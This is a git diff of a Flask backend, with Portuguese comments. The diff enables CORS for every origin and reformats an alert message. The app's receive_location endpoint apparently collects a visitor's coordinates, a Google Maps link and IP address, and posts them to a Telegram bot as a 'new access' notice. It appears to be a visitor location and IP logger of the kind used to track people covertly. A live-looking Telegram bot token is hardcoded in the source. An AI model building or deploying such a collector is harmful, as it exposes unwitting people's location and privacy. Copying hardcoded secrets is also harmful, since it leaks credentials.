@@ -1,8 +1,12 @@
 from flask import Flask, request, jsonify
+from flask_cors import CORS  # Adicione esta linha
 import requests
 from datetime import datetime
 
 app = Flask(__name__)
+
+# Permitir CORS para todos os domínios (ou adicione uma lista específica)
+CORS(app)  # Esta linha vai permitir CORS para todas as origens
 
 # Configurações do Telegram
 TELEGRAM_BOT_TOKEN = "8017455180:AAHUJG0RsWjCp2MoMnU_Rijq20lIZKGVhq0"
@@ -31,10 +35,10 @@ def receive_location():
         mensagem = f"""
 📢 *Novo Acesso Registrado!*
 
-🌍 *Localização: * [{latitude}, {longitude}]({maps_link})  
-📍 *Google Maps :* [Ver Localização]({maps_link})  
-💻 *IP do Usuário :* `{user_ip}`  
-⏰ *Data e Hora :* {data_hora}
+🌍 *Localização:* [{latitude}, {longitude}]({maps_link})  
+📍 *Google Maps:* [Ver Localização]({maps_link})  
+💻 *IP do Usuário:* `{user_ip}`  
+⏰ *Data e Hora:* {data_hora}
 """
 
         # Enviar para o Telegram
